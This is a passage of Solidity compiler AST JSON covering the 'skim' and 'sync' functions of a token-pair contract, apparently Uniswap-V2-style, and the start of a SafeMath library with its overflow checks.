																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "18453:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 2188,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18453:13:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2183,
																					"name": "_token1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2160,
																					"src": "18434:7:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 2182,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 533,
																				"src": "18427:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 2184,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18427:15:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$533",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 2185,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 494,
																		"src": "18427:25:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 2189,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18427:40:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 2190,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2270,
																"src": "18427:44:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 2192,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18427:54:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2179,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1096,
														"src": "18363:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 2193,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18363:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2194,
												"nodeType": "ExpressionStatement",
												"src": "18363:128:6"
											}
										]
									},
									"documentation": null,
									"id": 2196,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 2153,
											"modifierName": {
												"argumentTypes": null,
												"id": 2152,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "18112:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "18112:4:6"
										}
									],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2151,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2150,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2196,
												"src": "18091:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2149,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "18091:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "18090:12:6"
									},
									"returnParameters": {
										"id": 2154,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18117:0:6"
									},
									"scope": 2224,
									"src": "18077:421:6",
									"stateMutability": "nonpayable",
									"superFunction": 839,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2222,
										"nodeType": "Block",
										"src": "18574:184:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2207,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2386,
																			"src": "18638:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Pair_$2224",
																				"typeString": "contract Pair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Pair_$2224",
																				"typeString": "contract Pair"
																			}
																		],
																		"id": 2206,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18630:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 2208,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18630:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2203,
																			"name": "token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 968,
																			"src": "18612:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 2202,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 533,
																		"src": "18605:6:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 2204,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18605:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$533",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 2205,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 494,
																"src": "18605:24:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 2209,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18605:39:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2215,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2386,
																			"src": "18691:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Pair_$2224",
																				"typeString": "contract Pair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Pair_$2224",
																				"typeString": "contract Pair"
																			}
																		],
																		"id": 2214,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18683:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 2216,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18683:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2211,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 970,
																			"src": "18665:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 2210,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 533,
																		"src": "18658:6:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 2212,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18658:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$533",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 2213,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 494,
																"src": "18658:24:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 2217,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18658:39:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2218,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 974,
															"src": "18711:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 2219,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 976,
															"src": "18733:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 2201,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1286,
														"src": "18584:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 2220,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18584:167:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2221,
												"nodeType": "ExpressionStatement",
												"src": "18584:167:6"
											}
										]
									},
									"documentation": null,
									"id": 2223,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 2199,
											"modifierName": {
												"argumentTypes": null,
												"id": 2198,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "18569:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "18569:4:6"
										}
									],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2197,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18557:2:6"
									},
									"returnParameters": {
										"id": 2200,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18574:0:6"
									},
									"scope": 2224,
									"src": "18544:214:6",
									"stateMutability": "nonpayable",
									"superFunction": 842,
									"visibility": "external"
								}
							],
							"scope": 2225,
							"src": "226:18534:6"
						}
					],
					"src": "36:18725:6"
				},
				"id": 6
			},
			"SafeMath.sol": {
				"ast": {
					"absolutePath": "SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							2299
						]
					},
					"id": 2300,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2226,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0",
								"<",
								"0.7",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:31:7"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2299,
							"linearizedBaseContracts": [
								2299
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2247,
										"nodeType": "Block",
										"src": "267:66:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2243,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2240,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2236,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2233,
																			"src": "286:1:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2239,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2237,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2228,
																				"src": "290:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2238,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2230,
																				"src": "294:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "290:5:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "286:9:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2241,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "285:11:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2242,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2228,
																"src": "300:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "285:16:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6164642d6f766572666c6f77",
															"id": 2244,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "303:22:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															},
															"value": "ds-math-add-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															}
														],
														"id": 2235,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "277:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2245,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "277:49:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2246,
												"nodeType": "ExpressionStatement",
												"src": "277:49:7"
											}
										]
									},
									"documentation": null,
									"id": 2248,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2231,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2228,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2248,
												"src": "211:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2227,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "211:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2230,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2248,
												"src": "222:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2229,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "222:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "210:22:7"
									},
									"returnParameters": {
										"id": 2234,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2233,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2248,
												"src": "256:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2232,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "256:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "255:11:7"
									},
									"scope": 2299,
									"src": "198:135:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2269,
										"nodeType": "Block",
										"src": "408:67:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2265,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2262,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2258,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2255,
																			"src": "427:1:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2261,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2259,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2250,
																				"src": "431:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2260,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2252,
																				"src": "435:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "431:5:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "427:9:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2263,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "426:11:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2264,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2250,
																"src": "441:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "426:16:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d7375622d756e646572666c6f77",
															"id": 2266,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "444:23:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															},
															"value": "ds-math-sub-underflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															}
														],
														"id": 2257,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "418:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2267,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "418:50:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2268,
												"nodeType": "ExpressionStatement",
												"src": "418:50:7"
											}
										]
									},
									"documentation": null,
									"id": 2270,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2253,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2250,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2270,
												"src": "352:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2249,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "352:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2252,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2270,
												"src": "363:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2251,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "363:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "351:22:7"
									},
									"returnParameters": {
										"id": 2256,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2255,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2270,
												"src": "397:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2254,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "397:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "396:11:7"
									},
									"scope": 2299,
									"src": "339:136:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2297,
										"nodeType": "Block",
										"src": "550:80:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 2293,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2282,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2280,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2274,
																	"src": "568:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2281,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "573:1:7",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
